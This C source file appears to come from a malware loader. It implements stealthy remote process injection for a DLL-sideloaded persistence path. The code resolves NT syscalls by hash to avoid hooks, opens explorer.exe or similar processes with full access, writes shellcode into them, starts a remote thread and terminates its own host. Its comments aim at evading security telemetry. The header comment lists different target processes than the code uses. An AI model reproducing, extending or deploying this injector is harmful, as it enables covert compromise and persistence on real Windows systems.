// =============================================
// Inject.c — Remote process injection for persistence reboot path
//
// Compiled only for BUILD_DLL (sideload) builds.
// Called from main.c when the /pf flag is present (persistence reboot).
//
// Instead of running shellcode inside the host EXE (which causes ~25% CPU
// from the host application's own work), this function:
//   1. Enumerates running processes via NtQuerySystemInformation
//   2. Opens the first available low-CPU candidate:
//        RuntimeBroker.exe → SearchHost.exe → sihost.exe → dllhost.exe
//   3. Allocates RW memory in the target, writes shellcode, flips to RX
//   4. Creates a remote thread pointing at the shellcode
//   5. Calls NtTerminateProcess(-1) so the host EXE disappears
//
// Returns FALSE if no suitable target is found — main.c falls back to
// the thread-pool path (shellcode runs in-process as before).
//
// All four syscalls needed here (NtOpenProcess, NtQuerySystemInformation,
// NtWriteVirtualMemory, NtCreateThreadEx) are resolved lazily via
// FetchNtSyscall so that EXE builds are never affected.
// =============================================

#ifdef BUILD_DLL

#include "Common.h"

// ---------------------------------------------------------------------------
// Partial SYSTEM_PROCESS_INFORMATION layout (x64 only)
// Only fields through UniqueProcessId are used; the rest is padding.
//
// Verified offsets (Windows 10/11 x64):
//   +0x00  NextEntryOffset     ULONG
//   +0x04  NumberOfThreads     ULONG
//   +0x08  [48 bytes: WorkingSetPrivateSize..KernelTime]
//   +0x38  ImageName           UNICODE_STR  (16 bytes: len,maxlen,4pad,ptr)
//   +0x48  BasePriority        LONG
//   +0x4C  [4 bytes padding for HANDLE alignment]
//   +0x50  UniqueProcessId     HANDLE
// ---------------------------------------------------------------------------
typedef struct _INJ_PROC_INFO {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    BYTE           _pad[48];
    UNICODE_STR    ImageName;
    LONG           BasePriority;
    ULONG          _pad2;
    HANDLE         UniqueProcessId;
} INJ_PROC_INFO, *PINJ_PROC_INFO;

// CLIENT_ID used by NtOpenProcess (not in Windows.h, not in winternl.h on all SDKs)
typedef struct _INJ_CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} INJ_CLIENT_ID;

// Minimal OBJECT_ATTRIBUTES (winternl.h not included in Inject.c)
typedef struct _INJ_OBJ_ATTRS {
    ULONG  Length;
    HANDLE RootDirectory;
    PVOID  ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} INJ_OBJ_ATTRS;

// ---------------------------------------------------------------------------
// Case-insensitive wide-char compare:
//   a       — UNICODE_STRING.Buffer (not null-terminated)
//   aBytes  — UNICODE_STRING.Length (byte count, not char count)
//   b       — null-terminated candidate literal
// ---------------------------------------------------------------------------
static BOOL WideEqI(const WCHAR* a, USHORT aBytes, const WCHAR* b) {
    USHORT nChars = aBytes / 2;
    USHORT i;
    for (i = 0; b[i]; i++) {
        if (i >= nChars) return FALSE;
        WCHAR ca = a[i], cb = b[i];
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return FALSE;
    }
    return (i == nChars);
}

// Target process names, priority order.
// explorer / ctfmon / taskhostw are always running and nearly idle; explorer
// often has the CLR pre-loaded, reducing suspicious clr.dll load telemetry.
// dllhost is the last-resort fallback (multiple instances, one is usually idle).
static const WCHAR* const g_szTargets[] = {
    L"explorer.exe",
    L"ctfmon.exe",
    L"taskhostw.exe",
    L"dllhost.exe",
};
#define INJ_TARGET_COUNT 4

// ---------------------------------------------------------------------------
// InjectAndHijack
//
// pShellcode    — pointer to shellcode in the current process (RX mapped)
// dwSize        — shellcode byte count
//
// On success: NtTerminateProcess(-1) is called — this function does not return.
// On failure: returns FALSE so main.c falls back to thread-pool execution.
// ---------------------------------------------------------------------------
BOOL InjectAndHijack(IN PVOID pShellcode, IN DWORD dwSize) {

    if (!pShellcode || !dwSize)
        return FALSE;

    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
    if (!pNtdll) return FALSE;

    // --- Resolve the four injection syscalls lazily ---
    // FetchNtSyscall works after InitializeNtSyscalls has run (g_NtdllConfig ready).
    NT_SYSCALL sc_NtQSI  = { 0 };
    NT_SYSCALL sc_NtOP   = { 0 };
    NT_SYSCALL sc_NtWVM  = { 0 };
    NT_SYSCALL sc_NtCTE  = { 0 };

    if (!FetchNtSyscall(NtQuerySystemInformation_JOAAT, &sc_NtQSI) ||
        !FetchNtSyscall(NtOpenProcess_JOAAT,             &sc_NtOP)  ||
        !FetchNtSyscall(NtWriteVirtualMemory_JOAAT,      &sc_NtWVM) ||
        !FetchNtSyscall(NtCreateThreadEx_JOAAT,          &sc_NtCTE)) {
        LOG("[!] Inject: syscall resolution failed");
        return FALSE;
    }

    // --- Allocate enumeration buffer (1 MB) via NtAllocateVirtualMemory ---
    // NtAllocateVirtualMemory is already resolved in NtApis (passed via main.c),
    // but we re-resolve locally to keep InjectAndHijack self-contained.
    NT_SYSCALL sc_NtAVM = { 0 };
    if (!FetchNtSyscall(NtAllocateVirtualMemory_JOAAT, &sc_NtAVM)) {
        LOG("[!] Inject: NtAllocateVirtualMemory resolve failed");
        return FALSE;
    }

    PVOID  pEnumBuf = NULL;
    SIZE_T sBuf     = 1024 * 1024; // 1MB — sufficient for any running process list
    SET_SYSCALL(sc_NtAVM);
    NTSTATUS STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pEnumBuf,
        0, (ULONG_PTR)&sBuf,
        (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
        0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS) || !pEnumBuf) {
        LOG("[!] Inject: enum buffer alloc failed");
        return FALSE;
    }

    // --- NtQuerySystemInformation(SystemProcessInformation=5) ---
    ULONG dwNeeded = 0;
    SET_SYSCALL(sc_NtQSI);
    STATUS = RunSyscall(
        (ULONG_PTR)5,
        (ULONG_PTR)pEnumBuf,
        (ULONG_PTR)(ULONG)sBuf,
        (ULONG_PTR)&dwNeeded,
        0, 0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG("[!] Inject: NtQuerySystemInformation failed");
        return FALSE;
    }

    // --- Find target PID and open process (priority order) ---
    HANDLE hTarget = NULL;

    for (DWORD iCand = 0; iCand < INJ_TARGET_COUNT && !hTarget; iCand++) {
        // Scan process list for this candidate name
        HANDLE dwPid = NULL;
        PINJ_PROC_INFO pEntry = (PINJ_PROC_INFO)pEnumBuf;
        while (TRUE) {
            if (pEntry->ImageName.Buffer &&
                pEntry->ImageName.Length &&
                pEntry->UniqueProcessId &&
                WideEqI(pEntry->ImageName.Buffer,
                        pEntry->ImageName.Length,
                        g_szTargets[iCand])) {
                dwPid = pEntry->UniqueProcessId;
                break;
            }
            if (pEntry->NextEntryOffset == 0) break;
            pEntry = (PINJ_PROC_INFO)((PBYTE)pEntry + pEntry->NextEntryOffset);
        }
        if (!dwPid) continue;

        // Try to open the process
        INJ_OBJ_ATTRS oa;
        MemSet(&oa, 0, sizeof(oa));
        oa.Length = sizeof(oa);

        INJ_CLIENT_ID cid;
        cid.UniqueProcess = dwPid;
        cid.UniqueThread  = NULL;

        HANDLE hTmp = NULL;
        SET_SYSCALL(sc_NtOP);
        STATUS = RunSyscall(
            (ULONG_PTR)&hTmp,
            (ULONG_PTR)0x001FFFFF,  // PROCESS_ALL_ACCESS
            (ULONG_PTR)&oa,
            (ULONG_PTR)&cid,
            0, 0, 0, 0, 0, 0, 0, 0
        );
        if (NT_SUCCESS(STATUS) && hTmp)
            hTarget = hTmp;
    }

    if (!hTarget) {
        LOG("[!] Inject: no suitable target process found");
        return FALSE;
    }

    // --- Allocate RW memory in target process ---
    PVOID  pRemote      = NULL;
    SIZE_T sRemote      = (SIZE_T)dwSize;
    SET_SYSCALL(sc_NtAVM);
    STATUS = RunSyscall(
        (ULONG_PTR)hTarget, (ULONG_PTR)&pRemote,
        0, (ULONG_PTR)&sRemote,
        (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
        0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS) || !pRemote) {
        LOG("[!] Inject: remote alloc failed");
        return FALSE;
    }

    // --- Write shellcode into remote process ---
    SIZE_T sWritten = 0;
    SET_SYSCALL(sc_NtWVM);
    STATUS = RunSyscall(
        (ULONG_PTR)hTarget,
        (ULONG_PTR)pRemote,
        (ULONG_PTR)pShellcode,
        (ULONG_PTR)dwSize,
        (ULONG_PTR)&sWritten,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG("[!] Inject: NtWriteVirtualMemory failed");
        return FALSE;
    }

    // --- Flip remote allocation to RX ---
    NT_SYSCALL sc_NtPVM = { 0 };
    if (!FetchNtSyscall(NtProtectVirtualMemory_JOAAT, &sc_NtPVM)) {
        LOG("[!] Inject: NtProtectVirtualMemory resolve failed");
        return FALSE;
    }

    PVOID pProtAddr  = pRemote;
    SIZE_T sProtSize = (SIZE_T)dwSize;
    ULONG  dwOld     = 0;
    SET_SYSCALL(sc_NtPVM);
    STATUS = RunSyscall(
        (ULONG_PTR)hTarget,
        (ULONG_PTR)&pProtAddr,
        (ULONG_PTR)&sProtSize,
        (ULONG_PTR)SHELLCODE_EXEC_PROT,
        (ULONG_PTR)&dwOld,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG("[!] Inject: remote NtProtectVirtualMemory failed");
        return FALSE;
    }

    // --- NtCreateThreadEx: start shellcode in target ---
    HANDLE hThread = NULL;
    SET_SYSCALL(sc_NtCTE);
    STATUS = RunSyscall(
        (ULONG_PTR)&hThread,
        (ULONG_PTR)0x001FFFFF,  // THREAD_ALL_ACCESS
        (ULONG_PTR)NULL,         // ObjectAttributes
        (ULONG_PTR)hTarget,
        (ULONG_PTR)pRemote,      // StartRoutine = shellcode entry point
        (ULONG_PTR)NULL,         // Argument
        (ULONG_PTR)0,            // CreateFlags: 0 = run immediately
        (ULONG_PTR)0,            // ZeroBits
        (ULONG_PTR)0,            // StackSize (default)
        (ULONG_PTR)0,            // MaximumStackSize (default)
        (ULONG_PTR)NULL,         // AttributeList
        0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG("[!] Inject: NtCreateThreadEx failed");
        return FALSE;
    }

    LOG("[+] Inject: shellcode running in target, terminating host");

    // Shellcode is running in the target process.
    // Terminate the current host EXE — CPU drops to 0 from our side.
    typedef NTSTATUS (NTAPI* fnNtTerm)(HANDLE, NTSTATUS);
    fnNtTerm pNtTerm = (fnNtTerm)FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
    if (pNtTerm)
        pNtTerm((HANDLE)(ULONG_PTR)-1, 0);

    return TRUE; // unreachable on success
}

#endif /* BUILD_DLL */
